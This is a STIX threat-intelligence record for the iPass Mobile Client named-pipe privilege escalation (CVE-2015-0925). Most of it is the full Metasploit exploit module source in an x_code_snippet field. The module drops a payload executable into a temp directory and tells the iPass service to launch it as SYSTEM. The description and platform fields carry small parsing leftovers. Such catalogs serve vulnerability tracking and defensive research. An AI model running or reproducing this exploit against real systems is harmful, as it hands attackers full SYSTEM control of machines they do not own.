{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8cb844ab-460e-4676-a0f6-cbfa4c746610",
    "created": "2024-08-14T16:49:52.520462Z",
    "modified": "2024-08-14T16:49:52.520466Z",
    "name": "iPass Mobile Client Service Privilege Escalation",
    "description": " The named pipe, \\IPEFSYSPCPIPE, can be accessed by normal users to interact with the iPass service. The service provides a LaunchAppSysMode command which allows to execute arbitrary commands as SYSTEM.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ipass_launch_app.rb",
            "external_id": "ipass_launch_app.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0925"
        },
        {
            "source_name": "reference",
            "url": "https://www.mogwaisecurity.de/advisories/MSA-2015-03.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Services\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'iPass Mobile Client Service Privilege Escalation',\n          'Description' => %q{\n            The named pipe, \\IPEFSYSPCPIPE, can be accessed by normal users to interact\n            with the iPass service. The service provides a LaunchAppSysMode command which\n            allows to execute arbitrary commands as SYSTEM.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'h0ng10' # Vulnerability discovery, metasploit module\n          ],\n          'Arch' => ARCH_X86,\n          'Platform' => 'win',\n          'SessionTypes' => ['meterpreter'],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows', {} ]\n          ],\n          'Payload' => {\n            'Space' => 2048,\n            'DisableNops' => true\n          },\n          'References' => [\n            ['CVE', '2015-0925'],\n            ['URL', 'https://www.mogwaisecurity.de/advisories/MSA-2015-03.txt']\n          ],\n          'DisclosureDate' => '2015-03-12',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n                stdapi_sys_config_getenv\n              ]\n            }\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('WritableDir', [false, 'A directory where we can write files (%TEMP% by default)'])\n    ])\n  end\n\n  def check\n    unless session.platform == 'windows'\n      return Exploit::CheckCode::Safe\n    end\n\n    svc = service_info('iPlatformService')\n    if svc && svc[:display] =~ /iPlatformService/\n      vprint_good(\"Found service '#{svc[:display]}'\")\n      if is_running?\n        vprint_good('Service is running')\n      else\n        vprint_error('Service is not running!')\n      end\n\n      vprint_good('Opening named pipe...')\n      handle = open_named_pipe('\\\\\\\\.\\\\pipe\\\\IPEFSYSPCPIPE')\n\n      if handle.nil?\n        vprint_error('\\\\\\\\.\\\\pipe\\\\IPEFSYSPCPIPE named pipe not found')\n        return Exploit::CheckCode::Safe\n      else\n        vprint_good('\\\\\\\\.\\\\pipe\\\\IPEFSYSPCPIPE found!')\n        session.railgun.kernel32.CloseHandle(handle)\n      end\n\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def open_named_pipe(pipe)\n    invalid_handle_value = 0xFFFFFFFF\n\n    r = session.railgun.kernel32.CreateFileA(pipe, 'GENERIC_READ | GENERIC_WRITE', 0x3, nil, 'OPEN_EXISTING', 'FILE_FLAG_WRITE_THROUGH | FILE_ATTRIBUTE_NORMAL', 0)\n    handle = r['return']\n\n    return nil if handle == invalid_handle_value\n\n    handle\n  end\n\n  def write_named_pipe(handle, command)\n    buffer = Rex::Text.to_unicode(command)\n    w = client.railgun.kernel32.WriteFile(handle, buffer, buffer.length, 4, nil)\n\n    if w['return'] == false\n      print_error('The was an error writing to pipe, check permissions')\n      return false\n    end\n\n    true\n  end\n\n  def is_running?\n    begin\n      status = service_status('iPlatformService')\n    rescue RuntimeError\n      print_error('Unable to retrieve service status')\n      return false\n    end\n\n    return status && status[:state] == 4\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::NoTarget, 'Session is already elevated')\n    end\n\n    handle = open_named_pipe('\\\\\\\\.\\\\pipe\\\\IPEFSYSPCPIPE')\n\n    if handle.nil?\n      fail_with(Failure::NoTarget, '\\\\\\\\.\\\\pipe\\\\IPEFSYSPCPIPE named pipe not found')\n    else\n      print_status('Opended \\\\\\\\.\\\\pipe\\\\IPEFSYSPCPIPE! Proceeding...')\n    end\n\n    if datastore['WritableDir'] && !datastore['WritableDir'].empty?\n      temp_dir = datastore['WritableDir']\n    else\n      temp_dir = client.sys.config.getenv('TEMP')\n    end\n\n    print_status(\"Using #{temp_dir} to drop malicious exe\")\n\n    begin\n      cd(temp_dir)\n    rescue Rex::Post::Meterpreter::RequestError\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::BadConfig, \"Failed to use the #{temp_dir} directory\")\n    end\n\n    print_status('Writing malicious exe to remote filesystem')\n    write_path = pwd\n    exe_name = \"#{rand_text_alpha(rand(10..19))}.exe\"\n\n    begin\n      write_file(exe_name, generate_payload_exe)\n      register_file_for_cleanup(\"#{write_path}\\\\#{exe_name}\")\n    rescue Rex::Post::Meterpreter::RequestError\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::Unknown, \"Failed to drop payload into #{temp_dir}\")\n    end\n\n    print_status('Sending LauchAppSysMode command')\n\n    begin\n      write_res = write_named_pipe(handle, \"iPass.EventsAction.LaunchAppSysMode #{write_path}\\\\#{exe_name};;;\")\n    rescue Rex::Post::Meterpreter::RequestError\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::Unknown, 'Failed to write to pipe')\n    end\n\n    unless write_res\n      fail_with(Failure::Unknown, 'Failed to write to pipe')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-12",
    "x_mitre_platforms": [
        "win'"
    ]
}